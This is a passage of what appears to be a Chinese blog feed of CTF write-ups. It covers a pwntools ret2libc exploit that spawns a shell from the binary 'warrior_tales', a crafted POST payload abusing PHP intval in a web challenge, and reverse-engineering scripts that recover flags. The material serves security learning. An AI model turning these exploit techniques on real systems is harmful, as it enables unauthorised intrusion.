payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">52</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vlun_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
</code></pre>
<p>通过vlun函数循环进行leak</p>
<p>第二种</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>puts_plt = elf.symbols[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
start_addr = 0x080484D0
payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(start_addr) + p32(puts_got)
</code></pre><p>通过循环程序进行leak</p>
<p>可以获得puts_addr</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x59 bytes:
    00000000  57 68 61 74  20 61 20 77  6f 6e 64 65  72 66 75 6c  │What│ a w│onde│rful│
    00000010  20 65 6e 64  69 6e 67 21  0a a0 1c d9  f7 40 a5 d4  │ end│ing<span class="token operator">!</span>│····│·@··│
    00000020  f7 60 23 d9  f7 20 39 d9  f7 c0 e0 d8  f7 0a 48 65  │·`<span class="token comment" spellcheck="true">#·│· 9·│····│··He│</span>
    00000030  72 6f 21 20  4e 6f 77 2c  20 77 72 69  74 65 20 73  │ro<span class="token operator">!</span> │Now,│ wri│te s│
    00000040  6f 6d 65 74  68 69 6e 67  20 66 6f 72  20 79 6f 75  │omet│hing│ for│ you│
    00000050  72 20 73 74  6f 72 79 21  0a                        │r st│ory<span class="token operator">!</span>│·│
    00000059
puts_addr<span class="token operator">=</span> 0xf7d91ca0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> system <span class="token operator">=</span> 0xf7d6cda0
</code></pre>
<p>由于服务器关闭 这里本地进行getshell</p>
<p>exp</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>from pwn import *
from struct import pack

context.log_level = &#39;debug&#39; 
#libc = ELF(&#39;libc.so.6&#39;)
libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
elf = ELF(&#39;warrior_tales&#39;)

p1 = process(&#39;./warrior_tales&#39;)
log.info(p1.recvuntil(&quot;&gt;&quot;))
p1.sendline(&#39;ios&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;2&#39;)
log.info(p1.recvuntil(&quot;select your choice:&quot;))
p1.sendline(&#39;1&#39;)
log.info(p1.recvuntil(&quot;Hero! Now, write something for your story!&quot;))



puts_plt = elf.symbols[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
vlun_addr = 0x08048659
gdb.attach(p1,&#39;b *0x08048659&#39;)
raw_input(&#39;Go!!!&#39;)
payload1 = &quot;A&quot;*52+ p32(puts_plt) + p32(vlun_addr) + p32(puts_got)
p1.sendline(payload1)
p1.recvuntil(&#39;What a wonderful ending!\n&#39;)
data=u32(p1.recv(4))
puts_addr=data
print &#39;puts_addr= &#39;+hex(puts_addr)

system=libc.symbols[&#39;system&#39;]-libc.symbols[&#39;puts&#39;]+puts_addr
log.info(&#39;system = &#39; + hex(system))
binsh=next(libc.search(&#39;/bin/sh&#39;))-libc.symbols[&#39;puts&#39;]+puts_addr

payload=&quot;A&quot;*52+p32(system)+p32(1)+p32(binsh)
p1.sendline(payload)

p1.interactive()
</code></pre><p>运行结果</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">$ <span class="token function">whoami</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:
    <span class="token string">'whoami\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x4 bytes:
    <span class="token string">'ios\n'</span>
ios
$
</code></pre>
<p>最后感谢下 kaka师傅指出我的错误(0~0) </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/1.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;/p&gt;
&lt;p&gt;查看源码&lt;br&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/2.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;br&gt;得到Flag : flag{begin_to_npuctf}&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="NPUCTF" scheme="http://iosmosis.github.io/tags/NPUCTF/"/>
    
      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>北邮网安杯Writeup</title>
    <link href="http://iosmosis.github.io/2018/04/03/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AFWriteup/"/>
    <id>http://iosmosis.github.io/2018/04/03/北邮网安杯Writeup/</id>
    <published>2018-04-02T16:44:19.000Z</published>
    <updated>2018-06-09T08:28:48.424Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="WEB1-交易中心，你能买到FLAG吗？"><a href="#WEB1-交易中心，你能买到FLAG吗？" class="headerlink" title="WEB1 交易中心，你能买到FLAG吗？"></a>WEB1 交易中心，你能买到FLAG吗？</h3><p>提供了源码下载<br><img src="/2018/04/03/北邮网安杯Writeup/3.jpg" alt="源码"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<p><img src="/2018/04/03/北邮网安杯Writeup/1.jpg" alt="网站入口"></p>
<ul>
<li><!-- more -->
<the rest="" of="" contents="" |="" 余下全文=""><br>分析源码<br><img src="/2018/04/03/北邮网安杯Writeup/2.jpg" alt="源码分析"></the></li>
</ul>
<p>POST三个参数 并且通过||进行拼接 这样最后的payment应该为goods||message||goods<br><img src="/2018/04/03/北邮网安杯Writeup/4.jpg" alt="源码分析2"></p>
<h4 id="了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"><a href="#了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。" class="headerlink" title="了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"></a>了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。</h4><p>而参数message可控 所以可以想出让intval转换停在message所传值后面利用既然是利用||分割进行转换 所以这里传值时打乱原有的||分割使payment再次被分割时出现非数字使之停止</p>
<p>构造 直接在POST写入<br>所以构造payload：goods=4&amp;message=40|(此处为当时测试所用值)&amp;goods=1000<br>所得之后的数据为4||40|||1000 分割后会导致第三数据的1000变为|1000<br>提交得到flag</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>运行程序了解程序流程<br><img src="/2018/04/03/北邮网安杯Writeup/5.jpg" alt="程序测试"></p>
<p>进行了长度判断<br>不是很会RE 发现没有定位到main入口 就IDA+OD分析<br>定位到相关汇编代码<br><img src="/2018/04/03/北邮网安杯Writeup/6.jpg" alt="IDA1"></p>
<p>进行判断长度需要大于0Ah小于23h<br><img src="/2018/04/03/北邮网安杯Writeup/7.jpg" alt="IDA2"><br>shift+F12 字符串搜索<br><img src="/2018/04/03/北邮网安杯Writeup/16.jpg" alt="IDA2"><br>定位到data<br><img src="/2018/04/03/北邮网安杯Writeup/17.jpg" alt="IDA2"><br>双击<br>DATA XREF 找到原引用位置<br><img src="/2018/04/03/北邮网安杯Writeup/18.jpg" alt="IDA2"><br><img src="/2018/04/03/北邮网安杯Writeup/19.jpg" alt="IDA2"><br>通过快捷键P create一个函数 得到主体函数<br>然后再通过F5转为C </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>unsigned int __thiscall sub_401490(CWnd *this)
{
  CWnd *v1; // esi
  unsigned int result; // eax
  signed int v3; // eax
  int v4; // eax
  char v5; // [esp+Ch] [ebp-80h]
  char v6; // [esp+Dh] [ebp-7Fh]
  char v7; // [esp+Eh] [ebp-7Eh]
  char v8; // [esp+Fh] [ebp-7Dh]
  char v9; // [esp+10h] [ebp-7Ch]
  char v10; // [esp+11h] [ebp-7Bh]
  char v11; // [esp+12h] [ebp-7Ah]
  char v12; // [esp+13h] [ebp-79h]
  char v13; // [esp+14h] [ebp-78h]
  char v14; // [esp+15h] [ebp-77h]
  char v15; // [esp+16h] [ebp-76h]
  char v16; // [esp+17h] [ebp-75h]
  char v17; // [esp+18h] [ebp-74h]
  char v18; // [esp+19h] [ebp-73h]
  char v19; // [esp+1Ah] [ebp-72h]
  char v20; // [esp+1Bh] [ebp-71h]
  char v21; // [esp+1Ch] [ebp-70h]
  char v22; // [esp+1Dh] [ebp-6Fh]
  char v23; // [esp+1Eh] [ebp-6Eh]
  char v24; // [esp+1Fh] [ebp-6Dh]
  char v25; // [esp+20h] [ebp-6Ch]
  char v26; // [esp+21h] [ebp-6Bh]
  char v27; // [esp+22h] [ebp-6Ah]
  char v28; // [esp+23h] [ebp-69h]
  char v29; // [esp+24h] [ebp-68h]
  char v30; // [esp+25h] [ebp-67h]
  char v31; // [esp+26h] [ebp-66h]
  char v32; // [esp+27h] [ebp-65h]
  char v33; // [esp+28h] [ebp-64h]
  char v34; // [esp+29h] [ebp-63h]
  char v35; // [esp+2Ah] [ebp-62h]
  char v36; // [esp+2Bh] [ebp-61h]
  char v37; // [esp+2Ch] [ebp-60h]
  char v38[27]; // [esp+2Dh] [ebp-5Fh]
  char v39; // [esp+48h] [ebp-44h]
  __int16 v40; // [esp+89h] [ebp-3h]
  char v41; // [esp+8Bh] [ebp-1h]

  v1 = this;
  v33 = 0;
  memset(&amp;v34, 0, 0x60u);
  v40 = 0;
  v41 = 0;
  v11 = 67;
  v19 = 67;
  v22 = 67;
  v8 = 82;
  v15 = 82;
  v29 = 1;
  v30 = 1;
  v31 = 1;
  v5 = 119;
  v6 = 17;
  v7 = 77;
  v9 = 110;
  v10 = 23;
  v12 = 103;
  v13 = 18;
  v14 = 77;
  v16 = 97;
  v17 = 80;
  v18 = 69;
  v20 = 73;
  v21 = 87;
  v23 = 119;
  v24 = 83;
  v25 = 101;
  v26 = 65;
  v27 = 87;
  v28 = 121;
  v32 = 0;
  result = CWnd::GetDlgItemTextA(this, 1000, &amp;v33, 100);
  if ( result &gt; 0x23 || result &lt; 0xA )
    result = CWnd::MessageBoxA(v1, aTheLengthOfStr, aHint, 0);
  if ( v33 == 66 &amp;&amp; v34 == 85 &amp;&amp; v36 == 84 &amp;&amp; v35 == 80 &amp;&amp; v37 == 123 &amp;&amp; v39 == 125 )
  {
    v3 = 5;
    do
    {
      *(&amp;v33 + v3) = (*(&amp;v33 + v3) + 1) ^ 0x23;
      ++v3;
    }
    while ( v3 &lt; 32 );
    v4 = 0;
    do
    {
      v38[v4];
      *(&amp;v5 + v4++);
    }
    while ( v4 + 5 &lt; 32 );
    result = CWnd::MessageBoxA(v1, aCongratulation, aSuccess, 0);
  }
  return result;
}
</code></pre><p>修改调整数组<br><img src="/2018/04/03/北邮网安杯Writeup/20.jpg" alt="测试"><br>右键修改 重新F5得到清晰地代码 和密文</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>unsigned int __thiscall sub_401490(CWnd *this)
{
  CWnd *v1; // esi
  unsigned int result; // eax
  signed int v3; // eax
  int v4; // eax
  char v5[64]; // [esp+Bh] [ebp-81h]
  __int16 v6; // [esp+89h] [ebp-3h]
  char v7; // [esp+8Bh] [ebp-1h]

  v1 = this;
  v5[29] = 0;
  memset(&amp;v5[30], 0, 0x60u);
  v6 = 0;
  v7 = 0;
  v5[7] = 67;
  v5[15] = 67;
  v5[18] = 67;
  v5[4] = 82;
  v5[11] = 82;
  v5[25] = 1;
  v5[26] = 1;
  v5[27] = 1;
  v5[1] = 119;
  v5[2] = 17;
  v5[3] = 77;
  v5[5] = 110;
  v5[6] = 23;
  v5[8] = 103;
  v5[9] = 18;
  v5[10] = 77;
  v5[12] = 97;
  v5[13] = 80;
  v5[14] = 69;
  v5[16] = 73;
  v5[17] = 87;
  v5[19] = 119;
  v5[20] = 83;
  v5[21] = 101;
  v5[22] = 65;
  v5[23] = 87;
  v5[24] = 121;
  v5[28] = 0;
  result = CWnd::GetDlgItemTextA(this, 1000, &amp;v5[29], 100);
  if ( result &gt; 0x23 || result &lt; 0xA )
    result = CWnd::MessageBoxA(v1, aTheLengthOfStr, aHint, 0);
  if ( v5[29] == 66 &amp;&amp; v5[30] == 85 &amp;&amp; v5[32] == 84 &amp;&amp; v5[31] == 80 &amp;&amp; v5[33] == 123 &amp;&amp; v5[61] == 125 )
  {
    v3 = 5;
    do
    {
      v5[v3 + 29] = (v5[v3 + 29] + 1) ^ 0x23;
      ++v3;
    }
    while ( v3 &lt; 32 );
    v4 = 0;
    do
    {
      v5[v4 + 34];
      v5[v4++ + 1];
    }
    while ( v4 + 5 &lt; 32 );
    result = CWnd::MessageBoxA(v1, aCongratulation, aSuccess, 0);
  }
  return result;
}
</code></pre><p>得到密文之后可以进行 还原<br>Payload1</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
str<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> list<span class="token punctuation">:</span>
    str<span class="token operator">+=</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> str
<span class="token comment" spellcheck="true">#  BUPT{S1mpL3_C0mpAre_is_SoEasY!!!}</span>
</code></pre>
<p>pyload2 无名师傅</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">intx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
v6<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">67</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">67</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">67</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">82</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">82</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">119</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">77</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">110</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">103</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">77</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">97</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">69</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">73</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'W'</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">119</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">83</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">101</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'W'</span><span class="token punctuation">;</span>
v6<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span>inti<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">27</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span><span class="token number">0x23</span><span class="token punctuation">;</span>
    v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
return0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="/2018/04/03/北邮网安杯Writeup/10.jpg" alt="测试"></p>
<h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p><img src="/2018/04/03/北邮网安杯Writeup/11.jpg" alt="流程"></p>
<p>简单走流程 猜测应该和RE1思路相似 需要解密某加密</p>
<p>载入分析</p>
<p><img src="/2018/04/03/北邮网安杯Writeup/12.jpg" alt="流程1"></p>
<p><img src="/2018/04/03/北邮网安杯Writeup/13.jpg" alt="流程2"></p>
<p><img src="/2018/04/03/北邮网安杯Writeup/14.jpg" alt="流程3"></p>
<p>分析可以得出 加密方式为RC4加密<br>解密流程与加密流程相同<br>可以写的脚本跑出密文并走过第二个函数进行解密</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># /usr/bin/python</span>
<span class="token comment" spellcheck="true"># coding=utf-8</span>

<span class="token comment" spellcheck="true">#dump初始化后的密钥流，做xor运算,拿到密钥流直接跑函数2出结果</span>
data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x7C</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x3E</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x0E</span><span class="token punctuation">,</span><span class="token number">0xB4</span><span class="token punctuation">,</span><span class="token number">0xCC</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0xBF</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0xD9</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xFB</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xCE</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x4B</span><span class="token punctuation">,</span><span class="token number">0x0E</span><span class="token punctuation">,</span><span class="token number">0xB5</span><span class="token punctuation">,</span><span class="token number">0xF7</span><span class="token punctuation">,</span><span class="token number">0x3E</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0xEE</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xA0</span><span class="token punctuation">,</span><span class="token number">0xC5</span><span class="token punctuation">,</span><span class="token number">0x3A</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">]</span>
s<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xD5</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xFD</span><span class="token punctuation">,</span><span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0x1D</span><span class="token punctuation">,</span><span class="token number">0xB3</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xA0</span><span class="token punctuation">,</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span><span class="token number">0x95</span>
<span class="token punctuation">,</span><span class="token number">0xD3</span><span class="token punctuation">,</span><span class="token number">0xF8</span><span class="token punctuation">,</span><span class="token number">0x6F</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF1</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0xAA</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xCF</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xB1</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x0E</span><span class="token punctuation">,</span><span class="token number">0x21</span>
<span class="token punctuation">,</span><span class="token number">0x8A</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0xA9</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0xCB</span><span class="token punctuation">,</span><span class="token number">0x4A</span><span class="token punctuation">,</span><span class="token number">0xDD</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xED</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0xD6</span>
<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0xD9</span><span class="token punctuation">,</span><span class="token number">0xAB</span><span class="token punctuation">,</span><span class="token number">0xCC</span><span class="token punctuation">,</span><span class="token number">0xE2</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0xBC</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x4B</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0x3E</span><span class="token punctuation">,</span><span class="token number">0xC8</span><span class="token punctuation">,</span><span class="token number">0x6C</span>
